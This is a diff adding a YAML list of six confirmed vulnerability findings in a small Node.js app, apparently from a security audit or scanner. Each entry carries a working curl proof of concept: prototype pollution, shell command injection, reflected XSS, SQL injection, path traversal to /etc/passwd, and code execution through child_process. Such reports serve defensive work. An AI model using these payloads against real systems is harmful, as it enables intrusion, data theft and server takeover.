@@ -1,0 +1,86 @@
+validated_findings:
+  - finding_id: VULN-001
+    status: confirmed
+    type: prototype_pollution
+    location:
+      file: src/merge.js
+      line: 14
+    attack_path:
+      - step: 1
+        action: "Send JSON with __proto__.isAdmin = true via POST /merge"
+      - step: 2
+        action: "Observe polluted Object.prototype affecting all objects"
+    proof_of_concept: |
+      curl -X POST http://target/merge -H 'Content-Type: application/json' -d '{"__proto__":{"isAdmin":true}}'
+    impact: "Arbitrary property injection on all objects, potential authentication bypass or RCE"
+
+  - finding_id: VULN-002
+    status: confirmed
+    type: command_injection
+    location:
+      file: src/exec.js
+      line: 12
+    attack_path:
+      - step: 1
+        action: "Send GET request with shell metacharacters in host parameter"
+      - step: 2
+        action: "Observe injected command output appended to ping results"
+    proof_of_concept: "curl 'http://target/ping?host=;id'"
+    impact: "Arbitrary OS command execution as Node.js process user, full system compromise"
+
+  - finding_id: VULN-003
+    status: confirmed
+    type: xss_reflected
+    location:
+      file: src/render.js
+      line: 16
+    attack_path:
+      - step: 1
+        action: "Craft URL with JavaScript payload in name parameter"
+      - step: 2
+        action: "Send crafted URL to victim, script executes in their browser"
+    proof_of_concept: "curl 'http://target/greet?name=<script>alert(document.cookie)</script>'"
+    impact: "Session hijacking, credential theft, phishing via injected content"
+
+  - finding_id: VULN-004
+    status: confirmed
+    type: sql_injection
+    location:
+      file: src/query.js
+      line: 15
+    attack_path:
+      - step: 1
+        action: "Send GET request with SQL injection payload in name parameter"
+      - step: 2
+        action: "Injected SQL modifies query logic, extracting unauthorized data"
+    proof_of_concept: "curl 'http://target/user?name=admin%27%20OR%20%271%27=%271'"
+    impact: "Full database access, data exfiltration, potential authentication bypass"
+
+  - finding_id: VULN-005
+    status: confirmed
+    type: path_traversal
+    location:
+      file: src/files.js
+      line: 13
+    attack_path:
+      - step: 1
+        action: "Send GET request with directory traversal sequences in path parameter"
+      - step: 2
+        action: "Read arbitrary files from the server filesystem"
+    proof_of_concept: "curl 'http://target/download?path=../../../etc/passwd'"
+    impact: "Arbitrary file read, exposure of configuration files, credentials, and source code"
+
+  - finding_id: VULN-006
+    status: confirmed
+    type: code_execution
+    location:
+      file: src/compute.js
+      line: 11
+    attack_path:
+      - step: 1
+        action: "Send POST request with JavaScript code in expression field"
+      - step: 2
+        action: "Server evaluates arbitrary code via Function constructor"
+    proof_of_concept: |
+      curl -X POST http://target/compute -H 'Content-Type: application/json' -d '{"expression":"require(\"child_process\").execSync(\"id\").toString()"}'
+    impact: "Arbitrary code execution in Node.js context, full server compromise"
